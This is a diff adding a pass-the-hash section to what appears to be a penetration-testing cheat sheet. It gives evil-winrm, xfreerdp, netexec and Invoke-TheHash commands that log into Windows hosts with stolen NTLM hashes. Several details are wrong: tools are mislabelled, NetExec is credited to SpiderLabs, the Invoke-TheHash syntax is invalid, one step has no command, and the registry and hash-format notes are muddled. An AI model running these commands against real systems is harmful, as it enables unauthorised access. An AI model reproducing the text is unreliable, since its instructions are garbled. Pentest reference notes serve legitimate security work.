@@ -659,12 +659,73 @@ nxc smb <IP> -u <user> -p <pass> --spider IT --content --pattern "passw"
 <br>
 <br>
 
+# Pass-the-Hash Attack Methods
+
+## 1. Using PowerShell Remoting with Evil-WinRM
+**Tool:** `evil-winrm`
+*   Command example for RDP:
+    ```powershell
+    evil-winrm -i [target-ip] -u Administrator -H "[NTLM-hash]"
+    ```
+*   Note: For domain accounts, include the domain name in the username if using a domain account.
+
+## 2. Using Mimikatz via SMB/RDP
+**Tool:** `xfreerdp` or `evil-winrm`
+*   Command example for RDP:
+    ```bash
+    xfreerdp /v:[target-ip] /u:Administrator --pth:NTLM:"[hash]" /cert-ignore
+    ```
+
+## 3. Using Netexec (for network scanning)
+**Tool:** `NetExec from SpiderLabs`
+*   Command examples:
+    *   Check if a host is vulnerable:
+      ```powershell
+      netexec smb [host-or-range]
+      ```
+    *   Test PTH with local admin hash:
+
+## 4. Using Invoke-theHash for SMB/RDP authentication testing
+**Tool:** `invoke-thehash (PowerShell-based)`
+*   Command example via SMB:
+    ```powershell
+    invoke-thehash -computer "[target-ip]" -hashes "[NTLM-hash]"
+    ```
+
+### Common Requirements
+*   Ensure the target host has PowerShell remoting enabled or RDP accessible.
+*   Check if UAC settings allow PTH by verifying "DisableRestrictedAdmin" registry key value (must be 0x0).
+
+### Important Notes for Beginners
+*   Always use NTLM hash format with : separating credentials and hash
+*   Include domain name when targeting domain accounts
+*   Combine multiple tools like NetExec, Mimikatz, and Invoke-theHash for comprehensive testing
+
+### Ethical Considerations
+Only perform these operations on systems you have explicit permission to test. These examples are provided for educational purposes only.
 
 
+<br>
+<br>
+<br>
+
+<br>
+<br>
+<br>
 
 
+<br>
+<br>
+<br>
+
+<br>
+<br>
+<br>
 
 
+<br>
+<br>
+<br>
 End
 
 ## Additional Notes & Tips
